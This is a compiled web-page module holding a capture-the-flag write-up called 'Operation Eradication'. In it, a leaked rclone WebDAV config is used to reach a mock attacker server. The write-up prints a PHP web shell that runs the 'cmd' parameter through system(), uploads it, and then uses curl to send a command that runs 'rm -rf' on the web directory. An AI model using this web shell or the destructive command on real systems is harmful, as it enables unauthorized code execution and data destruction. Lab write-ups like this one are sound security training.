import{s as se,n as yn}from"./scheduler.rijuCTql.js";import{S as te,i as pe,g as t,s as o,H as r,h as p,I as c,c as l,j as u,z as d,f as e,k,a as s}from"./index.7JfBVtF2.js";function oe(On){let i,xn="Operation Eradication",z,h,_n=`ðŸ‘» Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don&#39;t receive payment!
<p><em>They stole our data!</em></p> <p>Luckily, we found what looks like a configuration file, that seems to have credentials to the actorâ€™s storage serverâ€¦ but it doesnâ€™t seem to work. Can you get onto their server and delete all the data they stole!?</p>`,F,m,Hn="We are given a webserver instance, alongside an <strong><code>operation_eradication</code></strong> file, which is plain Ascii with the following content:",j,f,Y,Qn=`<code class="language-undefined">type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`,G,v,Tn="We know this is a <code>Webdav</code> server, and that we can access the Webdav instance at <code>http://chal.ctf.games:30236/webdav</code>. Checking out the main page alongside the Webdav endpoint, we can see the server wants to authenticate with a <code>Basic</code> Authorization header, but no matter what we enter, we cannot access the Webdav service.",$,g,Pn='<img src="/img/operation_eradication_img/Untitled.png" alt="1"/>',X,w,Rn='<img src="/img/operation_eradication_img/Untitled%201.png" alt="Untitled"/>',I,b,En='<img src="/img/operation_eradication_img/Untitled%202.png" alt="Untitled"/>',O,y,Cn="We can try to do a bit of decoding/decryption, but we wonâ€™t get a hash analysis tool to give us even a guess - our <code>user</code> and <code>pass</code> strings are 72 characters long, arenâ€™t URL-safe b64 encoded, and are generally just not going to be easily cracked.",Q,x,Un="Thankfully, we can Google the config template and find that it belongs to <code>Rclone</code>, which can be used to connect to remote Webdav servers.",B,_,Wn="Downloading Rclone, we can run through a setup of a config file, and then edit itâ€™s contents to match the file provided:",D,H,J,Bn=`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone config
<span class="token comment"># run through config setup ...</span>
Current remotes:

Name                 <span class="token function">Type</span>
====                 ====
huntress             webdav

<span class="token comment"># ...</span>

s<span class="token punctuation">)</span> <span class="token function">Set</span> configuration password
q<span class="token punctuation">)</span> Quit config
e/n/d/r/c/s/q> q

<span class="token comment"># then replace it's contents with our desired config:</span>

<span class="token function">echo</span> <span class="token string">"[huntress]
type = webdav
url = http://chal.ctf.games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5"</span> > C:\\Users\\zacwo\\AppData\\Roaming&#92;rclone&#92;rclone<span class="token punctuation">.</span>conf

<span class="token function">cat</span> C:\\Users\\zacwo\\AppData\\Roaming&#92;rclone&#92;rclone<span class="token punctuation">.</span>conf
<span class="token namespace">[huntress]</span>
<span class="token function">type</span> = webdav
url = http:<span class="token operator">/</span><span class="token operator">/</span>chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5</code>`,K,T,Mn="Next, lets try listing the Webdavâ€™s contents to see if our configuration works:",nn,P,en,Dn=`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone tree huntress:
<span class="token operator">/</span>
â”œâ”€â”€ Accounting
â”‚   â”œâ”€â”€ 2021
â”‚   â”‚   â””â”€â”€ AnnualReport<span class="token punctuation">.</span>pdf
â”‚   â”œâ”€â”€ 2022
â”‚   â”‚   â”œâ”€â”€ Quarter1_MonthlyRevenue<span class="token punctuation">.</span>xlsx
<span class="token comment"># ...</span>
â”‚   â””â”€â”€ Training
â”‚       â”œâ”€â”€ 2022
â”‚       â”‚   â”œâ”€â”€ AdvancedSalesSkillsCourse<span class="token punctuation">.</span>pdf
â”‚       â”‚   â””â”€â”€ NewSalesRepTraining<span class="token punctuation">.</span>pdf
â”‚       â””â”€â”€ SalesTrainingManual<span class="token punctuation">.</span>pdf</code>`,an,R,Ln="Looks like its functional. Unfortunately, we canâ€™t just <code>.\\\\rclone delete huntress:/</code> - I guess some kind of backend configuration on the remote machine stops us from doing this - we do, however, have write permissions, and can upload files to the machine.",sn,E,qn="As with any PHP service, we may be able to gain code execution as <code>www-data</code> (who would usually have ownership of <code>/var/www/html/</code>) so my immediate thoughts were that it might be possible to execute code through malicious PHP.",tn,C,Nn="We tragically canâ€™t execute commands from our Rclone shell, so weâ€™ll have to try to run something from the HTTP service. As the service is publicly available, only requires a single command, and honestly I donâ€™t feel like spinning up <code>ngrok</code> tunnels, we can just use a PHP <code>cmd</code> script:",pn,U,on,Jn=`<code class="language-php">// written to 'exec.php':

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span> <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span> <span class="token keyword">die</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code>`,ln,W,cn,Kn=`<code class="language-powershell"><span class="token punctuation">.</span>&#92;rclone <span class="token function">copy</span> C:\\<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>\\exec<span class="token punctuation">.</span>php huntress:<span class="token operator">/</span>
<span class="token punctuation">.</span>&#92;rclone <span class="token function">ls</span> huntress:<span class="token operator">/</span>
       50 exec<span class="token punctuation">.</span>php
  1745724 ProductDevelopment/2022/ProductRoadmap<span class="token punctuation">.</span>pdf
  3570194 ProductDevelopment/2023/ProductRoadmap<span class="token punctuation">.</span>pdf
  3510400 HumanResources/EmployeeHandbook<span class="token punctuation">.</span>pdf
  7680849 ProductDevelopment/Specifications/NewProductSpecs<span class="token punctuation">.</span>pdf
  3891213 ProductDevelopment/Specifications/UpdatedProductSpecs<span class="token punctuation">.</span>pdf
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code>`,rn,M,Sn="We still donâ€™t know how to Auth, so we can try to intercept the <code>Rclone</code>â†” <code>Webdav</code> traffic with <code>Wireshark</code>:",un,L,dn,ne=`<code class="language-powershell">PROPFIND <span class="token operator">/</span>webdav/ HTTP/1<span class="token punctuation">.</span>1
Host: chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236
User-Agent: rclone/v1<span class="token punctuation">.</span>64<span class="token punctuation">.</span>2
Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz
Depth: 1
Referer: http:<span class="token operator">/</span><span class="token operator">/</span>chal<span class="token punctuation">.</span>ctf<span class="token punctuation">.</span>games:30236/webdav/
Accept-Encoding: gzip</code>`,kn,q,Vn="Finally, we can use <code>curl</code> to execute <code>bash -c &quot;rm -rf &lt;[the webdav endpoint]&gt;...&quot;;</code>  as a <code>GET</code> param passed to the <code>exec.php</code> file we just uploaded - Iâ€™ve included an additional <code>echo &#39;done&#39;</code> command after running <code>rm -rf</code> just as a sanity check, so we know weâ€™re executing a command given the lack of feedback.",hn,N,An="Essentially, we are querying the URI <code>http://chal.ctf.games:30236/webdav/test/exec.php?cmd=bash+-c+\\\\&quot;rm+-rf+/var/www/html/webdav/*;+echo+\\\\&#39;done.\\\\&#39;\\\\&quot;</code> while supplying the header info expected for such an HTTP request:",mn,S,fn,ee=`<code class="language-bash">	<span class="token function">curl</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-k</span> <span class="token parameter variable">-X</span> <span class="token string">$'GET'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token parameter variable">-H</span> <span class="token string">$'Host: localhost'</span> <span class="token parameter variable">-H</span> <span class="token string">$'User-Agent: rclone/v1.64.2'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token parameter variable">-H</span> <span class="token string">$'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
		<span class="token parameter variable">-H</span> <span class="token string">$'Depth: 1'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Accept-Encoding: gzip'</span> <span class="token parameter variable">-H</span> <span class="token string">$'Content-Type: application/x-httpd-php'</span> <span class="token punctuation"></span><span class="token punctuation"></span>
    <span class="token string">$'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+<span class="token entity" title="\\">\\</span>"rm+-rf+/var/www/html/webdav/*;+echo+<span class="token entity" title="\\">\\</span>'</span>done.<span class="token punctuation"></span><span class="token punctuation"></span>'<span class="token punctuation"></span><span class="token punctuation"></span>"'</code>`,vn,V,gn,ae=`<code class="language-php">curl <span class="token operator">-</span>i <span class="token operator">-</span>s <span class="token operator">-</span>k <span class="token operator">-</span><span class="token class-name type-declaration">X</span> $<span class="token string single-quoted-string">'GET'</span> \\
    <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Host: localhost'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'User-Agent: rclone/v1.64.2'</span> \\
    <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Authorization: Basic VkFIeWNZaEsyYXc5VE5GR1NwTWYxYl8yWk5uWnVBTmNJOC0yNmF3R0xZa3dSekp3UF9idU5zWjFlUXdSa21qUW1WenhNZTVyOlN1cGVyRXh0cmVtZWx5U2VjdXJlUGFzc3dvcmRMaWtlQWx3YXlz'</span> \\
		<span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Depth: 1'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Referer: http://chal.ctf.games:30236/webdav/'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Accept-Encoding: gzip'</span> <span class="token operator">-</span><span class="token class-name type-declaration">H</span> $<span class="token string single-quoted-string">'Content-Type: application/x-httpd-php'</span> \\
    $<span class="token string single-quoted-string">'http://chal.ctf.games:30236/webdav/exec.php?cmd=bash+-c+\\"rm+-rf+/var/www/html/webdav/*;+echo+\\'</span>done<span class="token operator">.</span>\\<span class="token string single-quoted-string">'\\"'</span>

<span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span> <span class="token number">200</span> <span class="token constant">OK</span>
Date<span class="token punctuation">:</span> Fri<span class="token punctuation">,</span> <span class="token number">20</span> Oct <span class="token number">2023</span> <span class="token number">18</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">02</span> <span class="token constant">GMT</span>
Server<span class="token punctuation">:</span> Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.54</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span>
<span class="token constant">X</span><span class="token operator">-</span>Powered<span class="token operator">-</span>By<span class="token punctuation">:</span> <span class="token constant">PHP</span><span class="token operator">/</span><span class="token number">7.4</span><span class="token number">.33</span>
Vary<span class="token punctuation">:</span> Accept<span class="token operator">-</span>Encoding
Content<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip
Transfer<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> chunked
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">;</span> charset<span class="token operator">=</span><span class="token constant">UTF</span><span class="token operator">-</span><span class="token number">8</span></code>`,wn,A,Zn="Refreshing the webappâ€™s root directory, we get our flag:",bn,Z,zn='<img src="/img/operation_eradication_img/Untitled%203.png" alt="Untitled"/>';return{c(){i=t("h1"),i.textContent=xn,z=o(),h=t("aside"),h.innerHTML=_n,F=o(),m=t("p"),m.innerHTML=Hn,j=o(),f=t("pre"),Y=new r(!1),G=o(),v=t("p"),v.innerHTML=Tn,$=o(),g=t("p"),g.innerHTML=Pn,X=o(),w=t("p"),w.innerHTML=Rn,I=o(),b=t("p"),b.innerHTML=En,O=o(),y=t("p"),y.innerHTML=Cn,Q=o(),x=t("p"),x.innerHTML=Un,B=o(),_=t("p"),_.textContent=Wn,D=o(),H=t("pre"),J=new r(!1),K=o(),T=t("p"),T.textContent=Mn,nn=o(),P=t("pre"),en=new r(!1),an=o(),R=t("p"),R.innerHTML=Ln,sn=o(),E=t("p"),E.innerHTML=qn,tn=o(),C=t("p"),C.innerHTML=Nn,pn=o(),U=t("pre"),on=new r(!1),ln=o(),W=t("pre"),cn=new r(!1),rn=o(),M=t("p"),M.innerHTML=Sn,un=o(),L=t("pre"),dn=new r(!1),kn=o(),q=t("p"),q.innerHTML=Vn,hn=o(),N=t("p"),N.innerHTML=An,mn=o(),S=t("pre"),fn=new r(!1),vn=o(),V=t("pre"),gn=new r(!1),wn=o(),A=t("p"),A.textContent=Zn,bn=o(),Z=t("p"),Z.innerHTML=zn,this.h()},l(n){i=p(n,"H1",{"data-svelte-h":!0}),c(i)!=="svelte-resiyg"&&(i.textContent=xn),z=l(n),h=p(n,"ASIDE",{"data-svelte-h":!0}),c(h)!=="svelte-148d465"&&(h.innerHTML=_n),F=l(n),m=p(n,"P",{"data-svelte-h":!0}),c(m)!=="svelte-1fa4x5"&&(m.innerHTML=Hn),j=l(n),f=p(n,"PRE",{class:!0});var a=u(f);Y=d(a,!1),a.forEach(e),G=l(n),v=p(n,"P",{"data-svelte-h":!0}),c(v)!=="svelte-64fv4v"&&(v.innerHTML=Tn),$=l(n),g=p(n,"P",{"data-svelte-h":!0}),c(g)!=="svelte-1ehhoo"&&(g.innerHTML=Pn),X=l(n),w=p(n,"P",{"data-svelte-h":!0}),c(w)!=="svelte-ue5d8c"&&(w.innerHTML=Rn),I=l(n),b=p(n,"P",{"data-svelte-h":!0}),c(b)!=="svelte-4cp7k9"&&(b.innerHTML=En),O=l(n),y=p(n,"P",{"data-svelte-h":!0}),c(y)!=="svelte-7t7knu"&&(y.innerHTML=Cn),Q=l(n),x=p(n,"P",{"data-svelte-h":!0}),c(x)!=="svelte-alhwr1"&&(x.innerHTML=Un),B=l(n),_=p(n,"P",{"data-svelte-h":!0}),c(_)!=="svelte-1lmnfxg"&&(_.textContent=Wn),D=l(n),H=p(n,"PRE",{class:!0});var Fn=u(H);J=d(Fn,!1),Fn.forEach(e),K=l(n),T=p(n,"P",{"data-svelte-h":!0}),c(T)!=="svelte-10457sn"&&(T.textContent=Mn),nn=l(n),P=p(n,"PRE",{class:!0});var jn=u(P);en=d(jn,!1),jn.forEach(e),an=l(n),R=p(n,"P",{"data-svelte-h":!0}),c(R)!=="svelte-gp0yxr"&&(R.innerHTML=Ln),sn=l(n),E=p(n,"P",{"data-svelte-h":!0}),c(E)!=="svelte-1iojygn"&&(E.innerHTML=qn),tn=l(n),C=p(n,"P",{"data-svelte-h":!0}),c(C)!=="svelte-12vqvs"&&(C.innerHTML=Nn),pn=l(n),U=p(n,"PRE",{class:!0});var Yn=u(U);on=d(Yn,!1),Yn.forEach(e),ln=l(n),W=p(n,"PRE",{class:!0});var Gn=u(W);cn=d(Gn,!1),Gn.forEach(e),rn=l(n),M=p(n,"P",{"data-svelte-h":!0}),c(M)!=="svelte-hv4obh"&&(M.innerHTML=Sn),un=l(n),L=p(n,"PRE",{class:!0});var $n=u(L);dn=d($n,!1),$n.forEach(e),kn=l(n),q=p(n,"P",{"data-svelte-h":!0}),c(q)!=="svelte-3c28lo"&&(q.innerHTML=Vn),hn=l(n),N=p(n,"P",{"data-svelte-h":!0}),c(N)!=="svelte-8swnc1"&&(N.innerHTML=An),mn=l(n),S=p(n,"PRE",{class:!0});var Xn=u(S);fn=d(Xn,!1),Xn.forEach(e),vn=l(n),V=p(n,"PRE",{class:!0});var In=u(V);gn=d(In,!1),In.forEach(e),wn=l(n),A=p(n,"P",{"data-svelte-h":!0}),c(A)!=="svelte-6x8aj4"&&(A.textContent=Zn),bn=l(n),Z=p(n,"P",{"data-svelte-h":!0}),c(Z)!=="svelte-1sjkdte"&&(Z.innerHTML=zn),this.h()},h(){Y.a=null,k(f,"class","language-undefined"),J.a=null,k(H,"class","language-powershell"),en.a=null,k(P,"class","language-powershell"),on.a=null,k(U,"class","language-php"),cn.a=null,k(W,"class","language-powershell"),dn.a=null,k(L,"class","language-powershell"),fn.a=null,k(S,"class","language-bash"),gn.a=null,k(V,"class","language-php")},m(n,a){s(n,i,a),s(n,z,a),s(n,h,a),s(n,F,a),s(n,m,a),s(n,j,a),s(n,f,a),Y.m(Qn,f),s(n,G,a),s(n,v,a),s(n,$,a),s(n,g,a),s(n,X,a),s(n,w,a),s(n,I,a),s(n,b,a),s(n,O,a),s(n,y,a),s(n,Q,a),s(n,x,a),s(n,B,a),s(n,_,a),s(n,D,a),s(n,H,a),J.m(Bn,H),s(n,K,a),s(n,T,a),s(n,nn,a),s(n,P,a),en.m(Dn,P),s(n,an,a),s(n,R,a),s(n,sn,a),s(n,E,a),s(n,tn,a),s(n,C,a),s(n,pn,a),s(n,U,a),on.m(Jn,U),s(n,ln,a),s(n,W,a),cn.m(Kn,W),s(n,rn,a),s(n,M,a),s(n,un,a),s(n,L,a),dn.m(ne,L),s(n,kn,a),s(n,q,a),s(n,hn,a),s(n,N,a),s(n,mn,a),s(n,S,a),fn.m(ee,S),s(n,vn,a),s(n,V,a),gn.m(ae,V),s(n,wn,a),s(n,A,a),s(n,bn,a),s(n,Z,a)},p:yn,i:yn,o:yn,d(n){n&&(e(i),e(z),e(h),e(F),e(m),e(j),e(f),e(G),e(v),e($),e(g),e(X),e(w),e(I),e(b),e(O),e(y),e(Q),e(x),e(B),e(_),e(D),e(H),e(K),e(T),e(nn),e(P),e(an),e(R),e(sn),e(E),e(tn),e(C),e(pn),e(U),e(ln),e(W),e(rn),e(M),e(un),e(L),e(kn),e(q),e(hn),e(N),e(mn),e(S),e(vn),e(V),e(wn),e(A),e(bn),e(Z))}}}const ie={title:"Operation Eradication",description:"Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment!",author:"huntress",date:"2023-10-14",published:!0};class re extends te{constructor(i){super(),pe(this,i,null,oe,se,{})}}export{re as default,ie as metadata};
